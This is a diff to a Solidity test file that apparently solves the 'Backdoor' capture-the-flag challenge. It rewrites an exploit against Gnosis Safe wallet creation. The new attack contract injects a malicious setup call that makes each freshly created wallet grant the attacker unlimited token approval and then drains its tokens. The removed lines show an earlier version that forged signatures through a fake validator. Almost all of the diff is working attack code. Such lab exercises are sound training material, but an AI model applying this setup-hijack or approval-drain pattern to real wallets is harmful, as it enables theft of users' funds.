@@ -73,7 +73,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        new AttackEntryPoint(recovery, users, singletonCopy, walletFactory, walletRegistry);
+        new AttackEntryPoint(recovery, users, singletonCopy, walletFactory, walletRegistry, IERC20(address(token)));
     }
 
     /**
@@ -98,19 +98,9 @@ contract BackdoorChallenge is Test {
     }
 }
 
-contract MaliciousSetupContract is Safe, ISignatureValidator {
-    function maliciousSetup(address fakeOwner) external {
-        owners[fakeOwner] = address(0xBEEF);
-    }
-
-    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
-        return EIP1271_MAGIC_VALUE;
-    }
-}
-
-contract MaliciousSafeOwner is ISignatureValidator {
-    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
-        return EIP1271_MAGIC_VALUE;
+contract MaliciousSetupContract {
+    function maliciousSetup(address attacker, IERC20 token) external {
+        token.approve(attacker, type(uint256).max);
     }
 }
 
@@ -120,15 +110,13 @@ contract AttackEntryPoint {
         address[] memory users,
         Safe singletonCopy,
         SafeProxyFactory walletFactory,
-        WalletRegistry walletRegistry
+        WalletRegistry walletRegistry,
+        IERC20 token
     ) {
         MaliciousSetupContract setupContract = new MaliciousSetupContract();
-        MaliciousSafeOwner safeOwner = new MaliciousSafeOwner();
-        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(safeOwner));
-        bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
+        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(this), token);
         address[] memory safeOwners = new address[](1);
         Safe safe;
-        bytes memory txSig;
 
         for (uint256 i = 0; i < users.length; i++) {
             safeOwners[0] = users[i];
@@ -150,23 +138,7 @@ contract AttackEntryPoint {
                     )
                 )
             );
-            txSig = abi.encodePacked(
-                bytes32(uint256(uint160(address(safeOwner)))), bytes32(uint256(65)), uint8(0), // actual signature
-                bytes32(""), bytes32(""), uint8(0) // dummy value to increase the length
-            );
-
-            safe.execTransaction(
-                address(walletRegistry.token()),
-                0, // value
-                tokenTransferData,
-                Enum.Operation.Call, // use call (not delegate call)
-                0, // safeTxGas (unused)
-                0, // baseGas (unused)
-                0, // gasPrice (unused)
-                address(0), // gasToken (unused)
-                payable(address(0)), // refundReceiver (unused)
-                txSig
-            );
+            token.transferFrom(address(safe), recovery, 10e18);
         }
     }
 }
